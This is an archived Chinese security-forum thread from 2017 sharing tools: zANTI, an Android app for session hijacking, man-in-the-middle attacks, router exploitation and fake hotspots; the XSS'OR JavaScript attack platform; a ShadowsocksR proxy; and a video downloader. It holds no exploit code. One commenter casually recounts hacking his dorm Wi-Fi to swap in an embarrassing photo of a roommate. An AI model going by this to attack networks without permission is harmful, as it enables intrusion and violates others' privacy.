<img src="https://file.xiaomiquan.com/fd/52/fd52795f8c90530dd8d49e20cb3ddbccc3ce8bae8e54e99b936597ba4f6c3026.jpg" width="25px"/> __hi404__: hashcat很牛逼的


...

---

## zANTI

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-18:


__#工具#__

内网渗透神器 App：zANTI 2.5.0 下载

刚刚看到 zANTI 的这篇文章：


[zANTI APK 2.5.0 Download For Android 2017 - Zanti ...](http://zantiapk.com/zanti-apk/)

 

介绍了 2.5.0 的下载，特性如下：

+ Hijack HTTP session.
+ Audit passwords.
+ MIMT(Man in the middle attack)
+ Network scanning.
+ Capture downloads.
+ Exploit routers.
+ MAC address spoofing.
+ Create a fake wifi hotspot.
+ Modify HTTP request.

我玩黑手（黑客手机）必定会安装 zANTI，这在做内网的渗透，尤其是自动主机及端口扫描，爆破，一些漏洞利用，路由器攻击，中间人劫持，Wi-Fi 伪造等方面，非常方便。

如果你有安卓手机，可以安装一个体验体验，需要 root。

<img src="https://images.xiaomiquan.com/Fi34-cbHoXhVOAxFlCxN--CjE5NN?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:OLaYLTc5o1l4q1AHyuJwhYB235c=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/17/1c/171c87fc22c8962abf10593ecbffe676b24ca95af8a9073951adb2fb18e4db9c.jpg" width="25px"/> __NashLing__: Fing也不错

<img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: 最近新换了一个手机，一加3t，之前听说这个可以刷kali官方推送的nethunter的rom包，然后就自己折腾了一下把它刷到手机上，这个app让我联想到了kali的这款rom，具体参考freebuf:

[移动渗透测试平台搭建 – NetHunter 3.0 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/sectool/124074.html)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: Nethunter强大多了

<img src="https://file.xiaomiquan.com/f4/8a/f48a9a75747df8c1d7007d92d14ce161cfb6c950627b0478a854a96b9ee104ff.jpg" width="25px"/> __PattyBug™__: 回去买一加3T😉

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 昨天稍微玩了一下，把我们宿舍的wifi给黑了，把图片替换为我们宿舍一哥们只穿内裤时的图片。。只是一不小心把自己的手机给攻击了，某些应用连不上网，只能重新刷了一遍系统，真是折腾

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 怎么会需要重装？

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 试过重启路由器没用，用4g网也没用，重启手机也没用，只能重新刷一下系统了哎~不过还好之前刷过机，一会儿就搞定了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: ...缓存估计

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 嗯，这个我也想到了，只是手机没有清理缓存的软件，应用也装不了(T＿T)，就重刷了

<img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 去年想研究NetHunter，当时一加只出到2,买回来是刷上了，不过Type-C连接外置网卡研究了很久都没成功过，有倒过此坑的同学吱个声哈

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__: 刷成功了，只是某些东西还不太会配置。。


...

---


## XSSOR


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-25:

XSS'OR - Hack with JavaScript 开源！

采用 BSD 开源协议，很宽松，不限制传播与商业化，留下作者版权就好。


[GitHub - evilcos/xssor2: XSS'OR - Hack with JavaSc...](https://github.com/evilcos/xssor2)



简单说明下：

上线之后（xssor.io），使用频率还不错。源码是 Python 及 JavaScript，采用了 Django、Bootstrap、jQuery 三个优秀框架，可以完整覆盖前后端，基于这三个框架，开发速度非常的快，整个过程消耗我不到一周时间，其中一半耗时在软件设计上。感兴趣这个过程的，可以读这套源码，很简洁，在开发过程中我特意去掉数据库（因为我觉得我这个应用场景其实不需要数据库）。

既然开源了，后续应该会和新组建的 ATToT 安全团队一起去完善它。

有任何问题，欢迎联系我。



...

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 这个是攻击平台吗

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: xssor.io 玩玩就知道

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-13:


__#工具#__

  XSS'OR 今天更新了，很强大，如果会玩的话。

更新了两个小地方：

Probe 探针支持 file:// 协议了；
Probe 探针的状态做了优化；

在线体验：xssor.io
开源地址：

[GitHub - evilcos/xssor2: XSS'OR - Hack with JavaScript.](https://github.com/evilcos/xssor2)



<img src="https://images.xiaomiquan.com/FjFXjgxTAku6ZUw885v0lOQmQY3P?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:mBhlxLgPMFq6twDtZX0TKjEawEY=" width="50%" height="50%" align="middle"/>


---

## Proxy

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-07-20:

for some reason，少年，抽个SSR吧

[shadowsocks-rss/readme.md at master · breakwa11/sh...](https://github.com/breakwa11/shadowsocks-rss/blob/master/readme.md)



...

<img src="https://file.xiaomiquan.com/c7/0e/c70e5f97b5bc36fffa24c5b1d92138c1db4dd711c3802fcc6e6eb0aeaac50b03.jpg" width="25px"/> __Ctf__: 与NG版本的有什么区别吗

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/c7/0e/c70e5f97b5bc36fffa24c5b1d92138c1db4dd711c3802fcc6e6eb0aeaac50b03.jpg" width="25px"/> __Ctf__: 带混淆模块

...

---


---

## 杂


<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@@ATToT__ on 2017-07-11:

有趣实用的杂项分享

You-Get 一款实用的网站视频下载工具（谁用谁知道）

安装：`pip3 install you-get`

用法：`you-get 视频播放页面的url`

官方站： [You-Get](https://you-get.org/)

github: [GitHub - soimort/you-get: Dumb downloader that scr...](https://github.com/soimort/you-get)

支持以下网站的视频/音频下载:

[SUPPORTED SITES](https://you-get.org/#supported-sites)

---


